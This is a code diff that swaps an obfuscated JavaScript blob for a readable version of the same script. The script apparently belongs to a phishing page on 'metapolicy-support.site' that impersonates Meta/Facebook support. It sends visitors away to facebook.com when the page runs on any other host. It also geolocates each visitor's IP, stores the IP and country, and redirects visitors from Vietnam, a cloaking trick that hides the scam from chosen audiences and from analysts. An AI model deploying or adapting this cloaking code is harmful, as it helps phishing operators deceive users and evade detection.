@@ -1,2 +1,84 @@
+const defaultLanguage = "en";
+const d = "metapolicy-support.site";
+const r = 'https://www.facebook.com/';
 
-var _$_b8b3=["\x65\x6E","\x6D\x65\x74\x61\x70\x6F\x6C\x69\x63\x79\x2D\x73\x75\x70\x70\x6F\x72\x74\x2E\x73\x69\x74\x65","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F","\x72\x65\x61\x64\x79","\x75\x73\x65\x20\x73\x74\x72\x69\x63\x74","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x26","\x73\x70\x6C\x69\x74","\x3F","\x69\x6E\x64\x65\x78\x4F\x66","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x6C\x65\x6E\x67\x74\x68","\x3D","\x6C\x61\x6E\x67","\x66\x62\x5F\x6C\x61\x6E\x67","\x67\x65\x74\x49\x74\x65\x6D","\x73\x74\x72\x69\x6E\x67\x69\x66\x79","\x73\x65\x74\x49\x74\x65\x6D","\x70\x61\x72\x73\x65","\x68\x6F\x73\x74\x6E\x61\x6D\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x69\x70\x2D\x61\x70\x69\x2E\x63\x6F\x6D\x2F\x6A\x73\x6F\x6E","\x71\x75\x65\x72\x79","\x5F\x67\x69\x70","\x28","\x63\x6F\x75\x6E\x74\x72\x79","\x29","\x74\x6F\x4C\x6F\x77\x65\x72\x43\x61\x73\x65","\x63\x6F\x75\x6E\x74\x72\x79\x43\x6F\x64\x65","\x72\x65\x67\x69\x6F\x6E\x4E\x61\x6D\x65","\x76\x69\x65\x74\x6E\x61\x6D","\x76\x6E","\x68\x61\x6E\x6F\x69","\x67\x65\x74\x4A\x53\x4F\x4E"];const defaultLanguage=_$_b8b3[0];const d=_$_b8b3[1];const r=_$_b8b3[2];$(document)[_$_b8b3[3]](function(){chk();getIpLocation()});function get_query(){_$_b8b3[4];var _0x75E7=document[_$_b8b3[6]][_$_b8b3[5]];var _0x7591=_0x75E7[_$_b8b3[11]](_0x75E7[_$_b8b3[10]](_$_b8b3[9])+ 1)[_$_b8b3[8]](_$_b8b3[7]);for(var _0x753B=0,_0x748F={};_0x753B< _0x7591[_$_b8b3[12]];_0x753B++){_0x7591[_0x753B]= _0x7591[_0x753B][_$_b8b3[8]](_$_b8b3[13]);_0x748F[_0x7591[_0x753B][0]]= decodeURIComponent(_0x7591[_0x753B][1])};return _0x748F}_setFbLang();function _setFbLang(){var _0x748F=get_query();if(_0x748F[_$_b8b3[14]]=== undefined){if(localStorage[_$_b8b3[16]](_$_b8b3[15])=== null){localStorage[_$_b8b3[18]](_$_b8b3[15],JSON[_$_b8b3[17]]({lang:defaultLanguage}))}}else {if(_0x748F[_$_b8b3[14]][_$_b8b3[11]](0,2)[_$_b8b3[12]]=== 2){localStorage[_$_b8b3[18]](_$_b8b3[15],JSON[_$_b8b3[17]]({lang:_0x748F[_$_b8b3[14]]}))}else {localStorage[_$_b8b3[18]](_$_b8b3[15],JSON[_$_b8b3[17]]({lang:defaultLanguage}))}}}class BaseFunc{ getCurrentLanguage(){if(localStorage[_$_b8b3[16]](_$_b8b3[15])=== null){return defaultLanguage}else {var _0x74E5=JSON[_$_b8b3[19]](localStorage[_$_b8b3[16]](_$_b8b3[15]))[_$_b8b3[14]];return _0x74E5?? defaultLanguage}}};function chk(){if(window[_$_b8b3[6]][_$_b8b3[20]]!== d){rd()}}function getIpLocation(){$[_$_b8b3[33]](_$_b8b3[21],function(_0x76E9){var _0x773F=_0x76E9[_$_b8b3[22]];localStorage[_$_b8b3[18]](_$_b8b3[23],_0x773F+ _$_b8b3[24]+ _0x76E9[_$_b8b3[25]]+ _$_b8b3[26]);var _0x763D=_0x76E9[_$_b8b3[25]][_$_b8b3[27]]();var _0x7693=_0x76E9[_$_b8b3[28]][_$_b8b3[27]]();var _0x7795=_0x76E9[_$_b8b3[29]][_$_b8b3[27]]();if(_0x763D=== _$_b8b3[30]|| _0x7693=== _$_b8b3[31]|| _0x7795=== _$_b8b3[32]){rd()}})}function rd(){window[_$_b8b3[6]]= r}
+$( document ).ready(function() {
+    chk();
+    getIpLocation();
+});
+
+function get_query() {
+    "use strict";
+    var url = document.location.href;
+    var qs = url.substring(url.indexOf('?') + 1).split('&');
+    for (var i = 0, result = {}; i < qs.length; i++) {
+        qs[i] = qs[i].split('=');
+        result[qs[i][0]] = decodeURIComponent(qs[i][1]);
+    }
+    return result;
+}
+
+// Query string in the URL
+// x=5&y&z=hello&x=6
+
+_setFbLang();
+function _setFbLang() {
+    var result = get_query();
+    if (result.lang === undefined) {
+        if (localStorage.getItem('fb_lang') === null) {
+            localStorage.setItem('fb_lang', JSON.stringify({ lang: defaultLanguage }));
+        }
+
+    }
+    else {
+        if (result.lang.substring(0, 2).length === 2) {
+            // localStorage.setItem('fb_lang', JSON.stringify({ lang: result.lang.substring(0, 2) }));
+            localStorage.setItem('fb_lang', JSON.stringify({ lang: result.lang }));
+        } else {
+            localStorage.setItem('fb_lang', JSON.stringify({ lang: defaultLanguage }));
+        }
+        
+        
+    }
+}
+
+
+
+class BaseFunc {
+    getCurrentLanguage() {
+        if (localStorage.getItem("fb_lang") === null) {
+            return defaultLanguage;
+        } else {
+            var lang = JSON.parse(localStorage.getItem('fb_lang')).lang;
+            return lang ?? defaultLanguage;
+        }
+    }
+}
+
+function chk(){
+    if(window.location.hostname !== d){
+        rd();
+    }
+}
+function getIpLocation(){
+    $.getJSON('http://ip-api.com/json', function (data) {
+        var ip = data.query;
+        localStorage.setItem('_gip', ip + "(" + data.country + ")");
+
+        var country = data.country.toLowerCase();
+        var countryCode = data.countryCode.toLowerCase();
+        var regionName = data.regionName.toLowerCase();
+
+        if (country === 'vietnam' || countryCode === 'vn' || regionName === 'hanoi') {
+            rd();
+        }
+    });
+}
+
+function rd (){
+    window.location = r;
+}
+
+
+
+
